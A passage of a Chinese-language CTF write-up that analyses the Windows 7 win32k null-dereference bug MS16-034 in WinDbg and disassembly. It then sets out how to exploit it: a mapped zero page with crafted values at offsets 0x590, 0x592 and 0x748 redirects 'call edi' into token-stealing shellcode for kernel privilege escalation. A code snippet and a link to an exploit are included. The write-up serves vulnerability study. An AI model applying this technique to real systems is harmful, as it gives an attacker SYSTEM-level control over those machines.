    903fca5c  ffb58778 903fca7c 903fcaf8 ffaabd60
第一个参数SURFOBJ的值是ffb58778，继续往后跟踪
    kd> p
    win32k!EngPaint+0x45:
    96adb6dc ff7508          push    dword ptr [ebp+8]
    kd> p
    win32k!EngPaint+0x48:
    96adb6df 8bc8            mov     ecx,eax
    kd> p
    win32k!EngPaint+0x4a:
    96adb6e1 e868e4f8ff      call    win32k!SURFACE::pfnBitBlt (96a69b4e)
    kd> dd 903fcaf8//这个值是BRUSH结构体
    903fcaf8  ffffffff 00000000 00000000 00edfc13
    903fcb08  00edfc13 00000000 00000006 00000004
    903fcb18  00000000 00ffffff ffaab7c4 00000000
    903fcb28  00000000 ffb58768 ffbff968 ffbffe68//偏移0x34存放的是0xffb58768
    903fcb38  ffbbd540 00000006 fe57bc38 00000014
    903fcb48  000000d3 00000001 ffffffff 83f77f01
    903fcb58  83ec0892 903fcb7c 903fcbb0 00000000
    903fcb68  903fcc10 83e17924 00000000 00000000
    kd> dd ffb58768//看一下0xffb58768的值
    ffb58768  068501b7 00000001 80000000 8754b030
    ffb58778  00000000 068501b7 00000000 00000000//这个值是0x0
    ffb58788  00000008 00000008 00000020 ffb588bc
我们发现在EBRUSHOBJ+34h位置存放的值，再+10h存放的正是之前的SURFOBJ，可以看到，0xffb58768和之前SURFOBJ对象的值0xffb58778正好相差10h，也就是说，之前ffb58768+1ch位置存放的就是SURFOBJ+0xc的值，可以看到而这个值来看一下SURFOBJ的结构
    typedef struct _SURFOBJ {
      DHSURF dhsurf;
      HSURF  hsurf;
      DHPDEV dhpdev;
      HDEV   hdev;
      SIZEL  sizlBitmap;
      ULONG  cjBits;
      PVOID  pvBits;
      PVOID  pvScan0;
      LONG   lDelta;
      ULONG  iUniq;
      ULONG  iBitmapFormat;
      USHORT iType;
      USHORT fjBitmap;
    } SURFOBJ;
前面DHSURF、HSURF、DHPDEV类型长度都是4字节，看到偏移+ch位置存放的是hdev对象，正是在PoC中未对hdev对象进行初始化直接引用，导致了漏洞的发生。我们也可以来看一下_EBRUSHOBJ的一些结构概况。
红框框应该是BRUSHOBJ，其中前4个字节时iSolidColor，中间4个字节是pvRbrush，后4个字节是flColorType，绿框框应该是在PoC中定义的hBrush的COLORREF，粉框框则是SURFOBJ-10h的一个结构，问题也出现在这里。
* * *
### PWN!!
* * *
知道了这个漏洞形成原因，我们来考虑利用过程，首先，我们回到触发漏洞的位置，这里引用了eax＋24，就是0x0＋24，在Win7下限制较少，不像Win8和Win10，在_EPROCESS结构中有VdmAllowed之类的来限制NtAllocateVirtualMemory申请零页内存，如果我们通过NtAllocateVirtualMemory申请零页内存，那么对应位置就不是一个无效地址了。
我们通过伪代码来看一下这一小部分的逻辑。
      P = 0;
      v69 = 0;
      a2 = *(struct EBRUSHOBJ **)(v6 + 28);//key！！a2被赋值为0了！
      v45 = (*((_BYTE *)a2 + 36) & 1) == 0;//引发BSOD位置
      v72 = 0;
      v75 = 0;
可以看到，在之前a2会由于hdev未初始化，而直接引用，被赋值为0x0，那么也就是说，在函数后面所有跟a2有关的操作部分，比如a2+0xn的操作，都是在零页内存位置做操作，比如后面的a2+36就是引发bsod的位置，将0x0+24h了。
那么也就是说，如果我们用NtAllocateVirtualMemory分配了零页内存，那么零页内存位置的值我们都是可控的，也就是说在win32k!bGetRealizedBrush中，所有跟a2相关的位置我们都是可控的。
换个角度讲，我们可以在零页位置构造一个fake
struct来控制一些可控的位置。接下来，为了利用，我们需要在win32k!bGetRealizedBrush中，找到一些可以利用的点。
找到了两个点，第一个点比较好找，第二个点我不够细心没找到，还是pxx提醒了我，感谢pxx师傅！
第一个点在
第二个点在
其中第一个点不好用，就是之前我说到的这是一个常数，这里引用的是EngRealizeBrush函数，是在传递参数时一个定值，这个值不能被修改。
因此我们能利用的位置应该就是第二个点，但其实，从我们漏洞触发位置，到漏洞利用位置有几处if语句判断，第一处。
    .text:BF840799 ; 119:       v23 = *((_WORD *)v20 + 712);
    .text:BF840799
    .text:BF840799 loc_BF840799:                           ; CODE XREF: bGetRealizedBrush(BRUSH *,EBRUSHOBJ *,int (*)(_BRUSHOBJ *,_SURFOBJ *,_SURFOBJ *,_SURFOBJ *,_XLATEOBJ *,ulong))+266j
    .text:BF840799                 movzx   edx, word ptr [eax+590h] ; check 0x590
    .text:BF8407A0 ; 120:       if ( !v23 )
    .text:BF8407A0                 cmp     dx, si
    .text:BF8407A3 ; 121:         goto LABEL_23;
    .text:BF8407A3                 jz      loc_BF8406F7
这时候v20的值是a2，而a2的值来自于 a2 = _(struct EBRUSHOBJ_ *)(v6 +
28);，之前已经分析过，由于未初始化，这个值为0，那么第一处在v23的if语句跳转中，需要置0+0x590位置的值为不为0的数。
接下来第二处跳转。
    .text:BF8407A3 ; 120:       if ( !v23 )
    .text:BF8407A3                 jz      loc_BF8406F7
    .text:BF8407A9 ; 122:       v24 = (struct EBRUSHOBJ *)((char *)v20 + 1426);
    .text:BF8407A9                 add     eax, 592h  ; Check 0x592
    .text:BF8407AE ; 123:       if ( !*(_WORD *)v24 )
    .text:BF8407AE                 cmp     [eax], si
    .text:BF8407B1 ; 124:         goto LABEL_23;
    .text:BF8407B1                 jz      loc_BF8406F7
这个地方又要一个if语句跳转，这个地方需要置0x592位置的值为不为0的数。
最后一处，也就是call edi之前的位置
    .text:BF8407F0                 mov     edi, [eax+748h]//edi赋值为跳板值
    .text:BF8407F6                 setz    cl
    .text:BF8407F9                 inc     ecx
    .text:BF8407FA                 mov     [ebp+var_14], ecx
    .text:BF8407FD ; 134:       if ( v26 )
    .text:BF8407FD                 cmp     edi, esi//这里仍旧是和0比较
    .text:BF8407FF                 jz      short loc_BF840823
这里检查的是0x748的位置，这个地方需要edi和esi做比较，edi不为0，这里赋值为替换token的shellcode的值就是不为0的值了，直接可以跳转。
只要绕过了这3处，就可以到达call edi了，而call
edi，又来自eax＋748，这个位置我们可控，这样就能到shellcode位置了，所以，我们需要在零页分配一个0x1000的内存（只要大于748，随便定义）。
随后布置这3个值，之后我们可以达到零页可控位置。
接下来，我们只需要在源码中使用steal token
shellcode，然后在内核态执行用户态shellcode，完成token替换，这样我们通过如下代码部署零页内存。
        void* bypass_one = (void *)0x590;
        *(LPBYTE)bypass_one = 0x1;
        void* bypass_two = (void *)0x592;
        *(LPBYTE)bypass_two = 0x1;
        void* jump_addr = (void *)0x748;
        *(LPDWORD)jump_addr = (DWORD)TokenStealingShellcodeWin7;
由于Win7下没有SMEP，因此我们也不需要使用ROP来修改CR4寄存器的值，这样，我们在RING0下执行RING3 shellcode完成提权。
最后，我提供一个我的Exploit的下载地址： https://github.com/k0keoyo/SSCTF-pwn450-ms16-034-writeup
请师傅们多多指教，谢谢！Have fun and PWN!
* * *